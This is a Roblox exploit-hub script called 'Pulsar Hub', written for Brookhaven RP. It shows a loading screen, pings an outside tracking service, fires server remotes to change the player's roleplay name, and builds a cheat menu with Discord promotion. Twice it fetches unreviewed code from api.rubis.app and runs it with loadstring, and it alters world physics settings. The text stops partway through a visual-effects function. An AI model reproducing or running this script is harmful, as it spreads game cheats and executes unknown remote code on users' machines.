local t1 = {}
local v2 = table.unpack or unpack
t1.value1 = game:GetService("TweenService")
t1.value2 = game:GetService("RunService")

local Players = game:GetService("Players")

game:GetService("CoreGui")
t1.value3 = Players.LocalPlayer:WaitForChild("PlayerGui")

local color3 = Color3.fromRGB(255, 0, 0)
local color3_2 = Color3.fromRGB(255, 50, 50)
local color3_3 = Color3.fromRGB(0, 0, 0)
local color3_4 = Color3.fromRGB(255, 255, 255)

t1.value4 = {
	Duration = 8,
	FadeOutTime = 1.5,
	BarColor = color3,
	BarGlow = color3_2,
	BackgroundColor = color3_3,
	TextColor = color3_4,
	ParticleCount = 150,
	ParticleSpeed = 2,
	ParticleSize = 3,
	MusicID = 79120642849019,
	MusicVolume = 0.5,
	PlayMusic = true
}
t1.value5 = {}
t1.value6 = nil
t1.value7 = {
	"Starting system...",
	"Loading interface...",
	"Entre em nosso discord..",
	"Join our Discord..",
	"Loading scripts...",
	"Optimizing performance...",
	"Thank you for running...",
	"Finalizing loading...",
	"Ready to use!"
}
t1.value8 = {}
t1.value6 = nil

function t1.value9()
    if not t1.value4.PlayMusic then
        return nil
    end

    local Sound = Instance.new("Sound")
    Sound.Name = "LoadingMusic"
    Sound.SoundId = "rbxassetid://" .. t1.value4.MusicID
    Sound.Volume = t1.value4.MusicVolume
    Sound.Looped = true
    Sound.Parent = game:GetService("SoundService")
    Sound:Play()

    return Sound
end

function t1.value10(p1)
    if t1.value6 then
        local tweenInfo = TweenInfo.new(p1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local v180 = t1.value1:Create(t1.value6, tweenInfo, {
            Volume = 0
        })
        v180:Play()
        v180.Completed:Connect(function()
            if t1.value6 then
                t1.value6:Stop()
                t1.value6:Destroy()
                t1.value6 = nil
            end
        end)
    end
end

function t1.value11(p2, p3, p4)
    local Frame = Instance.new("Frame")
    Frame.Name = "StarParticle"
    Frame.Parent = p2
    Frame.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    Frame.BorderSizePixel = 0
    Frame.Size = UDim2.new(0, math.random(2, t1.value4.ParticleSize), 0, math.random(2, t1.value4.ParticleSize))
    Frame.Position = UDim2.new(0, p3, 0, p4)
    Frame.ZIndex = 8
    Frame.BackgroundTransparency = math.random(0, 50) / 100

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(1, 0)
    UICorner.Parent = Frame

    local UIGradient = Instance.new("UIGradient")
    UIGradient.Parent = Frame
    UIGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))
    })

    local v195 = math.random(-100, 100) / 100 * t1.value4.ParticleSpeed
    local v196 = math.random(-100, 100) / 100 * t1.value4.ParticleSpeed
    local v197 = math.random(-5, 5)
    local v198 = math.random(1, 3)
    local v199 = math.random(30, 100) / 100

    return {
        frame = Frame,
        speedX = v195,
        speedY = v196,
        rotationSpeed = v197,
        pulseSpeed = v198,
        opacity = v199
    }
end

function t1.value12(p5)
    local ViewportSize = workspace.CurrentCamera.ViewportSize
    for _ = 1, t1.value4.ParticleCount do
        local v203 = math.random(0, ViewportSize.X)
        local v204 = math.random(0, ViewportSize.Y)
        local v205 = t1.value11(p5, v203, v204)
        table.insert(t1.value5, v205)
    end
end

function t1.value13()
    local ViewportSize = workspace.CurrentCamera.ViewportSize
    for _, v in pairs(t1.value5) do
        if v.frame and v.frame.Parent then
            local framePosition = v.frame.Position
            local v174 = framePosition.X.Offset + v.speedX
            local v175 = framePosition.Y.Offset + v.speedY

            if v174 < -10 then
                v174 = ViewportSize.X + 10
            elseif v174 > ViewportSize.X + 10 then
                v174 = -10
            end

            if v175 < -10 then
                v175 = ViewportSize.Y + 10
            elseif v175 > ViewportSize.Y + 10 then
                v175 = -10
            end

            v.frame.Position = UDim2.new(0, v174, 0, v175)
            v.frame.Rotation = v.frame.Rotation + v.rotationSpeed

            local v176 = math.sin(tick() * v.pulseSpeed) * 0.3 + 0.7
            v.frame.BackgroundTransparency = 1 - v.opacity * v176

            local v177 = math.sin(tick() * v.pulseSpeed * 0.5) * 0.2 + 1
            v.frame.Size = UDim2.new(0, t1.value4.ParticleSize * v177, 0, t1.value4.ParticleSize * v177)
        end
    end
end

function t1.value14(p7)
    local Frame = Instance.new("Frame")
    Frame.Name = "AdvancedBackground"
    Frame.Parent = p7
    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderSizePixel = 0
    Frame.Size = UDim2.new(1, 0, 1, 0)
    Frame.Position = UDim2.new(0, 0, 0, 0)
    Frame.ZIndex = 1

    local UIGradient = Instance.new("UIGradient")
    UIGradient.Parent = Frame
    UIGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 0, 0)),
        ColorSequenceKeypoint.new(0.3, Color3.fromRGB(0, 0, 0)),
        ColorSequenceKeypoint.new(0.7, Color3.fromRGB(60, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
    })
    UIGradient.Rotation = 45

    local v184 = t1.value1:Create(UIGradient, TweenInfo.new(4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
        Rotation = 225
    })
    v184:Play()
    table.insert(t1.value8, v184)

    local Frame2 = Instance.new("Frame")
    Frame2.Name = "Overlay"
    Frame2.Parent = Frame
    Frame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame2.BorderSizePixel = 0
    Frame2.Size = UDim2.new(1, 0, 1, 0)
    Frame2.Position = UDim2.new(0, 0, 0, 0)
    Frame2.ZIndex = 2
    Frame2.BackgroundTransparency = 0.3

    local UIGradient2 = Instance.new("UIGradient")
    UIGradient2.Parent = Frame2
    UIGradient2.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 0, 0)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 0, 0))
    })
    UIGradient2.Rotation = -45

    local v187 = t1.value1:Create(UIGradient2, TweenInfo.new(6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
        Rotation = 315
    })
    v187:Play()
    table.insert(t1.value8, v187)

    return Frame
end

function t1.value15(p8)
    for i = 1, 5 do
        local Frame = Instance.new("Frame")
        Frame.Name = "PulsingCircle" .. i
        Frame.Parent = p8
        Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        Frame.BorderSizePixel = 0
        Frame.Size = UDim2.new(0, i * 50 + 100, 0, i * 50 + 100)
        Frame.Position = UDim2.new(0.5, -(i * 25 + 50), 0.5, -(i * 25 + 50))
        Frame.ZIndex = 3
        Frame.BackgroundTransparency = i * 0.03 + 0.8

        local UICorner = Instance.new("UICorner")
        UICorner.CornerRadius = UDim.new(1, 0)
        UICorner.Parent = Frame

        local value1 = t1.value1
        local tweenInfo = TweenInfo.new(i * 0.3 + 2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)
        local uDim2 = UDim2.new(0, i * 60 + 120, 0, i * 60 + 120)
        local new = UDim2.new
        local Create = value1.Create
        local v215 = -(i * 30 + 60)
        local v216 = new(0.5, -(i * 30 + 60), 0.5, v215)
        local v217 = Create(value1, Frame, tweenInfo, {
            Size = uDim2,
            Position = v216,
            BackgroundTransparency = 0.95
        })
        v217:Play()
        table.insert(t1.value8, v217)
    end
end

function t1.value16()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "PremiumLoadingScreen"
    ScreenGui.Parent = t1.value3
    ScreenGui.ResetOnSpawn = false
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.ScreenInsets = Enum.ScreenInsets.None
    ScreenGui.IgnoreGuiInset = true

    local Frame = Instance.new("Frame")
    Frame.Name = "MainFrame"
    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = t1.value4.BackgroundColor
    Frame.BorderSizePixel = 0
    Frame.Size = UDim2.new(1, 0, 1, 0)
    Frame.Position = UDim2.new(0, 0, 0, 0)
    Frame.ZIndex = 10
    t1.value14(Frame)
    t1.value15(Frame)
    t1.value12(Frame)

    local Frame3 = Instance.new("Frame")
    Frame3.Name = "CenterContainer"
    Frame3.Parent = Frame
    Frame3.BackgroundTransparency = 1
    Frame3.Size = UDim2.new(0, 600, 0, 400)
    Frame3.Position = UDim2.new(0.5, -300, 0.5, -200)
    Frame3.ZIndex = 11

    local TextLabel = Instance.new("TextLabel")
    TextLabel.Name = "TitleLabel"
    TextLabel.Parent = Frame3
    TextLabel.BackgroundTransparency = 1
    TextLabel.Size = UDim2.new(1, 0, 0, 80)
    TextLabel.Position = UDim2.new(0, 0, 0, 0)
    TextLabel.Text = "Pulsar Hub"
    TextLabel.TextColor3 = t1.value4.TextColor
    TextLabel.TextScaled = true
    TextLabel.Font = Enum.Font.GothamBold
    TextLabel.ZIndex = 12

    local UIStroke = Instance.new("UIStroke")
    UIStroke.Parent = TextLabel
    UIStroke.Color = Color3.fromRGB(255, 0, 0)
    UIStroke.Thickness = 2
    UIStroke.Transparency = 0.5

    local UIGradient = Instance.new("UIGradient")
    UIGradient.Parent = TextLabel
    UIGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))
    })

    local v227 = t1.value1:Create(UIGradient, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
        Offset = Vector2.new(2, 0)
    })
    v227:Play()
    table.insert(t1.value8, v227)

    local v228 = t1.value1:Create(UIStroke, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
        Transparency = 0.1
    })
    v228:Play()
    table.insert(t1.value8, v228)

    local TextLabel2 = Instance.new("TextLabel")
    TextLabel2.Name = "SubtitleLabel"
    TextLabel2.Parent = Frame3
    TextLabel2.BackgroundTransparency = 1
    TextLabel2.Size = UDim2.new(1, 0, 0, 40)
    TextLabel2.Position = UDim2.new(0, 0, 0, 90)
    TextLabel2.Text = " Loading Pulsar Hub..."
    TextLabel2.TextColor3 = Color3.fromRGB(180, 180, 180)
    TextLabel2.TextScaled = true
    TextLabel2.Font = Enum.Font.Gotham
    TextLabel2.ZIndex = 12

    local Frame4 = Instance.new("Frame")
    Frame4.Name = "ProgressContainer"
    Frame4.Parent = Frame3
    Frame4.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    Frame4.BorderSizePixel = 0
    Frame4.Size = UDim2.new(1, 0, 0, 25)
    Frame4.Position = UDim2.new(0, 0, 0, 160)
    Frame4.ZIndex = 12

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = Frame4

    local UIStroke2 = Instance.new("UIStroke")
    UIStroke2.Parent = Frame4
    UIStroke2.Color = t1.value4.BarGlow
    UIStroke2.Thickness = 2
    UIStroke2.Transparency = 0.3

    local v233 = t1.value1:Create(UIStroke2, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
        Transparency = 0.1
    })
    v233:Play()
    table.insert(t1.value8, v233)

    local Frame5 = Instance.new("Frame")
    Frame5.Name = "ProgressBar"
    Frame5.Parent = Frame4
    Frame5.BackgroundColor3 = t1.value4.BarColor
    Frame5.BorderSizePixel = 0
    Frame5.Size = UDim2.new(0, 0, 1, 0)
    Frame5.Position = UDim2.new(0, 0, 0, 0)
    Frame5.ZIndex = 13

    local UICorner2 = Instance.new("UICorner")
    UICorner2.CornerRadius = UDim.new(0, 12)
    UICorner2.Parent = Frame5

    local UIGradient3 = Instance.new("UIGradient")
    UIGradient3.Parent = Frame5
    UIGradient3.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, t1.value4.BarColor),
        ColorSequenceKeypoint.new(0.5, t1.value4.BarGlow),
        ColorSequenceKeypoint.new(1, t1.value4.BarColor)
    })

    local v237 = t1.value1:Create(UIGradient3, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
        Offset = Vector2.new(1, 0)
    })
    v237:Play()
    table.insert(t1.value8, v237)

    local Frame6 = Instance.new("Frame")
    Frame6.Name = "GlowEffect"
    Frame6.Parent = Frame5
    Frame6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Frame6.BackgroundTransparency = 0.6
    Frame6.BorderSizePixel = 0
    Frame6.Size = UDim2.new(0, 60, 1, 0)
    Frame6.Position = UDim2.new(-0.2, 0, 0, 0)
    Frame6.ZIndex = 14

    local UICorner3 = Instance.new("UICorner")
    UICorner3.CornerRadius = UDim.new(0, 12)
    UICorner3.Parent = Frame6

    local TextLabel3 = Instance.new("TextLabel")
    TextLabel3.Name = "PercentageLabel"
    TextLabel3.Parent = Frame3
    TextLabel3.BackgroundTransparency = 1
    TextLabel3.Size = UDim2.new(1, 0, 0, 40)
    TextLabel3.Position = UDim2.new(0, 0, 0, 200)
    TextLabel3.Text = "0%"
    TextLabel3.TextColor3 = t1.value4.BarColor
    TextLabel3.TextScaled = true
    TextLabel3.Font = Enum.Font.GothamBold
    TextLabel3.ZIndex = 12

    local TextLabel4 = Instance.new("TextLabel")
    TextLabel4.Name = "StatusLabel"
    TextLabel4.Parent = Frame3
    TextLabel4.BackgroundTransparency = 1
    TextLabel4.Size = UDim2.new(1, 0, 0, 30)
    TextLabel4.Position = UDim2.new(0, 0, 0, 250)
    TextLabel4.Text = "Preparando..."
    TextLabel4.TextColor3 = Color3.fromRGB(150, 150, 150)
    TextLabel4.TextScaled = true
    TextLabel4.Font = Enum.Font.Gotham
    TextLabel4.ZIndex = 12

    local TextLabel5 = Instance.new("TextLabel")
    TextLabel5.Name = "DotsLabel"
    TextLabel5.Parent = Frame3
    TextLabel5.BackgroundTransparency = 1
    TextLabel5.Size = UDim2.new(0, 60, 0, 30)
    TextLabel5.Position = UDim2.new(1, -60, 0, 250)
    TextLabel5.Text = ""
    TextLabel5.TextColor3 = Color3.fromRGB(150, 150, 150)
    TextLabel5.TextScaled = true
    TextLabel5.Font = Enum.Font.Gotham
    TextLabel5.ZIndex = 12

    return ScreenGui, Frame5, TextLabel3, TextLabel4, TextLabel5, Frame6, Frame
end

function t1.value17(p9)
    local s1 = ""
    local n1 = 0
    spawn(function()
        while p9.Parent do
            n1 = (n1 + 1) % 4
            s1 = string.rep(".", n1)
            p9.Text = s1
            wait(0.4)
        end
    end)
end

-- Main execution
(function()
    t1.value9()
    local v243, v244, v245, v246, v247, v248, v249 = t1.value16()
    local v250 = v243
    local v251 = v244
    local v252 = v245
    local v253 = v246
    local v254 = v249

    t1.value17(v247)

    local connection = t1.value2.Heartbeat:Connect(function()
        t1.value13()
    end)
    table.insert(t1.value8, connection)

    local v256 = t1.value1:Create(v248, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
        Position = UDim2.new(1.3, 0, 0, 0)
    })
    v256:Play()
    table.insert(t1.value8, v256)

    local timestamp = tick()

    local function u258()
        local timestamp2 = tick()
        local _math = math
        local v983 = timestamp2 - timestamp
        local v984 = _math.min(v983 / t1.value4.Duration, 1)
        local v985 = math.floor(v984 * 100)

        t1.value1:Create(v251, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            Size = UDim2.new(v984, 0, 1, 0)
        }):Play()
        t1.value1:Create(v252, TweenInfo.new(0.1, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            TextColor3 = Color3.fromRGB(v985 * 2 + 0, v985 * 0.1 + 0, 0)
        }):Play()
        v252.Text = v985 .. "%"

        if t1.value4.Duration / #t1.value7 <= tick() - timestamp and #t1.value7 >= 1 then
            v253.Text = t1.value7[1]
            t1.value1:Create(v253, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                TextTransparency = 0
            }):Play()
        end

        if v984 >= 1 then
            wait(0.8)
            t1.value10(t1.value4.FadeOutTime)
            for v988, v989 in pairs(t1.value8) do
                if typeof(v989) == "RBXScriptConnection" then
                    v989:Disconnect()
                elseif typeof(v989) == "Tween" then
                    v989:Cancel()
                end
            end
            for _, v in pairs(t1.value5) do
                if v.frame then
                    v.frame:Destroy()
                end
            end
            local value1 = t1.value1
            local v993 = v254
            local tweenInfo = TweenInfo.new(t1.value4.FadeOutTime, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
            local uDim2 = UDim2.new(1.5, 0, 1.5, 0)
            local Create = value1.Create
            local uDim2_2 = UDim2.new(-0.25, 0, -0.25, 0)
            local v998 = Create(value1, v993, tweenInfo, {
                BackgroundTransparency = 1,
                Size = uDim2,
                Position = uDim2_2
            })
            local value1_2 = t1.value1
            local CenterContainer = v254.CenterContainer
            local new = TweenInfo.new
            local v1002 = t1.value4.FadeOutTime * 0.7
            local Back = Enum.EasingStyle.Back
            local Create2 = value1_2.Create
            local v1005 = new(v1002, Back, Enum.EasingDirection.In)
            local uDim2_3 = UDim2.new(0, 0, 0, 0)
            local uDim2_4 = UDim2.new(0.5, 0, 0.5, 0)
            local v1008 = Create2(value1_2, CenterContainer, v1005, {
                Size = uDim2_3,
                Position = uDim2_4
            })
            v998:Play()
            v1008:Play()
            v998.Completed:Connect(function()
                v250:Destroy()
            end)
            return
        end

        t1.value2.Heartbeat:Wait()
        u258()
    end

    u258()
end)()

local _, result = pcall(function()
    return game:HttpGet("https://nexviewsservice.shardweb.app/services/kitk4t_hub/start")
end)
local v10 = string.match(result or "", "reg") ~= nil
print("Checking the connection:", v10)

local LocalPlayer = game.Players.LocalPlayer
local s2 = "[ Pulsar Hub User ]"
if ({
    Riftod37 = true
})[LocalPlayer.Name] then
    s2 = "[ Pulsar Hub Owner ]"
end

game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer(table.unpack({
    [1] = "RolePlayBio",
    [2] = "Pulsar On Top"
}))
game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer(v2({ table.unpack({
    [1] = "RolePlayName",
    [2] = s2
}) }))
local v13 = game:GetService("ReplicatedStorage").RE["1RPNam1eColo1r"]
local unpack2 = table.unpack
local color3_5 = Color3.new(1, 1, 1)

v13:FireServer(v2({ unpack2({
    [1] = "PickingRPBioColor",
    [2] = color3_5
}) }))
local v16 = game:GetService("ReplicatedStorage").RE["1RPNam1eColo1r"]
local unpack3 = table.unpack
local _Color3 = Color3
local FireServer = v16.FireServer
local v20 = _Color3.new(1, 0, 0)

FireServer(v16, unpack3({
    [1] = "PickingRPNameColor",
    [2] = v20
}))
t1.value18 = loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/F1lf0CdtoxElaSTp/raw"))()
workspace.FallenPartsDestroyHeight = -1e999
t1.value19 = t1.value18:MakeWindow({
    Title = "Pulsar Hub",
    SubTitle = "Updated - by Dazzy",
    LoadText = "PulsarHub",
    Flags = "PulsarAsWere"
})
local value19 = t1.value19
local AddMinimizeButton = value19.AddMinimizeButton
local t2 = {
    Image = "rbxassetid://439595043",
    BackgroundTransparency = 0
}
local uDim = UDim.new(35, 1)

AddMinimizeButton(value19, {
    Button = t2,
    Corner = {
        CornerRadius = uDim
    }
})
task.delay(1, function()
    t1.value19:Dialog({
        Title = "Welcome to one of the best hubs",
        Text = "Join our Discord for giveaways",
        Options = {
            {
                "Discord",
                function()
        if setclipboard then
            setclipboard("https://discord.gg/NnkWr2M5rz")
            t1.value18:Notify({
                            Title = "Pulsar Hub",
                            Text = "Link do Discord copiado com sucesso!",
                            Duration = 5
                        })

            return
        end

        t1.value18:Notify({
                        Title = "Pulsar Hub",
                        Text = "Seu executor não permite copiar texto automaticamente.",
                        Duration = 5
                    })
    end
            },
            {
                "Open",
                function()
        t1.value18:Notify({
                        Title = "Pulsar Hub",
                        Text = "Bem-vindo(a) ao melhor Hub!",
                        Duration = 5
                    })
    end
            }
        }
    })
end)

local v25 = t1.value19:MakeTab({
    "Informations",
    "info"
})
v25:AddSection({ "Internet Things" })
v25:AddDiscordInvite({
    Name = "Pulsar Hub - Community",
    Description = "Stay up to date with all the news from our Hub",
    Logo = "rbxassetid://439595043",
    Invite = "https://discord.gg/NnkWr2M5rz"
})
v25:AddSection({ "Credits" })
v25:AddParagraph({
    "Owners",
    "Dazzy"
})
v25:AddParagraph({
    "Programmers",
    "Pulsar | Team"
})
v25:AddSection({ "Informations" })
t1.value20 = v25:AddParagraph({
    "Script Usage Time:",
    "00:00:00"
})
t1.value21 = 0
task.spawn(function()
    while true do
        local v259 = math.floor(t1.value21 / 3600)
        local v260 = math.floor(t1.value21 % 3600 / 60)
        local v261 = t1.value21 % 60
        local v262 = string.format("%02d:%02d:%02d", v259, v260, v261)

        t1.value20:Set(v262)

        local v263 = t1

        v263.value21 = v263.value21 + 1
        task.wait(1)
    end
end)
v25:AddParagraph({
    "You Language:",
    "English"
})
v25:AddParagraph({
    "You are Playing:",
    "Brookhaven RP"
})
v25:AddParagraph({
    "You are Using:",
    "Pulsar Hub"
})
v25:AddParagraph({
    "You are Using Version:",
    "X - Updated"
})
v25:AddSection({ "Others" })
v25:AddButton({
    Name = "Rejoin",
    Callback = function()
    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
end
})
t1.value19:MakeTab({
    "Browser",
    "wifi"
}):AddButton({
    Name = "Browser by Pulsar Hub - It doesn't work on Delta.",
    Callback = function()
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/09WI0rdvCDdDuIHd/raw"))()
end
})
local v26 = t1.value19:MakeTab({
    "Shaders",
    "server"
})
v26:AddSection({ "Shaders" })
v26:AddSection({ "Type 1 (Client-Sided)" })
v26:AddButton({
    Name = "Enable Shaders (Irreversible)",
    Callback = function()
    local t3 = {
            value1 = game:GetService("Workspace"),
            value2 = game:GetService("Lighting"),
            value3 = game:GetService("RunService"),
            value4 = game:GetService("Debris"),
            value5 = game:GetService("TweenService")
        }
    local SoundService = game:GetService("SoundService")
    local LocalPlayer2 = game:GetService("Players").LocalPlayer
    local Model = t3.value1:FindFirstChild("Model")

    if Model then
        local function u268(p10)
            local GetChildren = p10.GetChildren

            for _, v in pairs(GetChildren(p10)) do
                if v:IsA("BasePart") then
                    v.Material = Enum.Material.Basalt
                elseif v:IsA("Model") or v:IsA("Folder") then
                    u268(v)
                end
            end
        end

        if Model:FindFirstChild("001_SnowStreet") then
            u268(Model["001_SnowStreet"])
        end

        if Model:FindFirstChild("Street") then
            for _, descendant in pairs(Model.Street:GetDescendants()) do
                if descendant:IsA("BasePart") then
                    descendant.Material = Enum.Material.Basalt
                end
            end
        end

        for _, child in pairs(Model:GetChildren()) do
            if child:IsA("BasePart") and child.Name == "Sidewalk" or child.Name == "Wedge" and child.Material == Enum.Material.SmoothPlastic then
                child.Material = Enum.Material.Cobblestone
            end
        end

        Model.ChildAdded:Connect(function(child)
            if child:IsA("BasePart") and child.Name == "Sidewalk" or child.Name == "Wedge" and child.Material == Enum.Material.SmoothPlastic then
                child.Material = Enum.Material.Cobblestone
            end
        end)
    end

    t3.value6 = Instance.new("Part")
    t3.value6.Size = Vector3.new(1, 1, 1)
    t3.value6.Transparency = 1
    t3.value6.Anchored = true
    t3.value6.CanCollide = false
    t3.value6.Parent = t3.value1
    t3.value7 = (LocalPlayer2.Character or LocalPlayer2.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
    t3.value8 = Instance.new("Sound")
    t3.value8.Name = "BirdsSound"
    t3.value8.SoundId = "rbxassetid://1237969272"
    t3.value8.Looped = true
    t3.value8.Volume = 0.05
    t3.value8.Parent = t3.value6
    t3.value9 = Instance.new("Sound")
    t3.value9.SoundId = "rbxassetid://6654360741"
    t3.value9.Volume = 0.05
    t3.value9.Looped = false
    t3.value9.Parent = t3.value1
    t3.value3.Heartbeat:Connect(function()
        if t3.value7 and t3.value7.Parent then
            t3.value6.Position = t3.value7.Position + Vector3.new(0, 10, 0)
        end
    end)
    task.spawn(function()
        while true do
            local ClockTime = t3.value2.ClockTime

            if ClockTime >= 18 or ClockTime <= 6 then
                if t3.value8.IsPlaying then
                    t3.value8:Stop()
                end

                if t3.value9.IsPlaying then
                    t3.value9:Stop()
                end

                t3.value9:Play()
            else
                if t3.value9.IsPlaying then
                    t3.value9:Stop()
                end

                if not t3.value8.IsPlaying then
                    t3.value8:Play()
                end
            end

            wait(20)
        end
    end)

    local Part = Instance.new("Part")

    Part.Anchored = true    Part.CanCollide = false
    Part.Transparency = 1
    Part.Size = Vector3.new(1, 1, 1)
    Part.Position = Vector3.new(-27, 19, 15)
    Part.Parent = t3.value1

    local Attachment = Instance.new("Attachment")

    Attachment.Position = Vector3.new(-27, 19, 15)
    Attachment.Parent = Part

    local Sound = Instance.new("Sound")

    Sound.Name = "FountainSound"
    Sound.SoundId = "rbxassetid://4766793559"
    Sound.Looped = true
    Sound.Volume = 0.03
    Sound.EmitterSize = 10
    Sound.RollOffMode = Enum.RollOffMode.Linear
    Sound.MaxDistance = 100
    Sound.Parent = Attachment
    Sound:Play()

    local Sound2 = Instance.new("Sound")

    Sound2.Name = "MyCustomSound"
    Sound2.SoundId = "rbxassetid://9048659736"
    Sound2.Volume = 0.01
    Sound2.Looped = true
    Sound2.PlayOnRemove = false
    Sound2.Parent = t3.value1
    Sound2:Play()
    t3.value10 = false
    t3.value11 = {}
    t3.value12 = Instance.new("Folder", t3.value1)
    t3.value12.Name = "ShootingStars"
    t3.value13 = 300
    t3.value14 = 0.3
    t3.value15 = 12
    t3.value16 = 0.1
    t3.value17 = Instance.new("Sound", t3.value1)
    t3.value17.SoundId = "rbxassetid://1843520836"
    t3.value17.Volume = 0.3
    t3.value17.Looped = true
    t3.value17.Name = "SpaceAmbience"

    local function v277()
        local Part2 = Instance.new("Part")
        local v1017 = math.random(1, 3) * 0.5

        Part2.Size = Vector3.new(v1017, v1017, v1017)
        Part2.Position = Vector3.new(math.random(-1000, 1000), math.random(300, 700), math.random(-1000, 1000))
        Part2.Anchored = true
        Part2.CanCollide = false
        Part2.Material = Enum.Material.Neon

        local t4 = {
                Color3.fromRGB(255, 255, 255),
                Color3.fromRGB(255, 255, 180),
                Color3.fromRGB(180, 200, 255)
            }

        Part2.Color = t4[math.random(1, #t4)]
        Part2.Name = "Star"
        Part2.Parent = t3.value1

        local PointLight = Instance.new("PointLight", Part2)

        PointLight.Brightness = 2 + math.random() * 1.5
        PointLight.Range = 12
        spawn(function()
            while Part2.Parent and t3.value10 do
                Part2.Transparency = 0.2 + math.sin(tick() * math.random(2, 5)) * 0.2
                t3.value3.Heartbeat:Wait()
            end

            if Part2.Parent then
                Part2:Destroy()
            end
        end)
        table.insert(t3.value11, Part2)
    end
    local function v278()
        if not t3.value10 then
            return
        end
        local vector3 = Vector3.new(math.random(-1000, 1000), math.random(350, 600), math.random(-1000, 1000))
        local Unit = Vector3.new(math.random(-1, 1), math.random(-0.1, 0.1), math.random(-1, 1)).Unit
        local v1022 = math.random(350, 550)
        local v1023 = math.random() <= t3.value14
        local v1024 = v1023 and Color3.fromRGB(255, 50, 50) or Color3.fromRGB(255, 255, 220)
        local v1025 = v1023 and ColorSequence.new(Color3.fromRGB(255, 120, 0), Color3.fromRGB(255, 230, 50)) or ColorSequence.new(Color3.fromRGB(255, 255, 255), Color3.fromRGB(255, 255, 180))
        local Part3 = Instance.new("Part")
        Part3.Size = Vector3.new(0.5, 0.5, 3)
        Part3.Position = vector3
        Part3.Anchored = true
        Part3.CanCollide = false
        Part3.Material = Enum.Material.Neon
        Part3.Color = v1024
        Part3.Name = "ShootingStar"
        Part3.Parent = t3.value12
        local Attachment2 = Instance.new("Attachment", Part3)
        local Attachment3 = Instance.new("Attachment", Part3)
        Attachment3.Position = Vector3.new(0, 0, -3)
        local Trail = Instance.new("Trail", Part3)
        Trail.Attachment0 = Attachment2
        Trail.Attachment1 = Attachment3
        Trail.Lifetime = 0.35
        Trail.Color = v1025
        Trail.LightEmission = 1
        Trail.WidthScale = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 1),
                NumberSequenceKeypoint.new(1, 0)
            })
        local PointLight = Instance.new("PointLight", Part3)
        PointLight.Brightness = not v1023 and 7 or 12
        PointLight.Range = 35
        PointLight.Color = v1024
        if v1023 then
            local Fire = Instance.new("Fire", Part3)

            Fire.Heat = 15
            Fire.Size = 3.5
            Fire.Color = Color3.fromRGB(255, 110, 0)
            Fire.SecondaryColor = Color3.fromRGB(255, 210, 0)
        end
        local v1032 = math.random(1, 1.5)
        local n2 = 0
        local connection
        connection = t3.value3.Heartbeat:Connect(function(dt)
            if not t3.value10 then
                connection:Disconnect()

                if Part3.Parent then
                    Part3:Destroy()
                end

                return
            end

            n2 = n2 + dt

            if n2 >= v1032 then
                connection:Disconnect()

                if Part3.Parent then
                    Part3:Destroy()
                end

                return
            end

            local v1335 = math.sin(n2 * 20) * 0.5
            local v1336 = Part3
            local s3 = "Position"
            local v1338 = (Unit + Vector3.new(0, v1335, 0)).Unit * v1022 * dt

            v1336[s3] = v1336[s3] + v1338
        end)
        t3.value4:AddItem(Part3, 4)
    end
    local function v279()
        local ClockTime = t3.value2.ClockTime
        local v1036 = ClockTime >= 18 or ClockTime < 6

        if v1036 and not t3.value10 then
            t3.value10 = true
            t3.value2.FogColor = Color3.fromRGB(10, 10, 30)
            t3.value2.FogEnd = 5000
            t3.value2.Brightness = 2

            for _, v in ipairs(t3.value11) do
                if v and v.Parent then
                    v:Destroy()
                end
            end

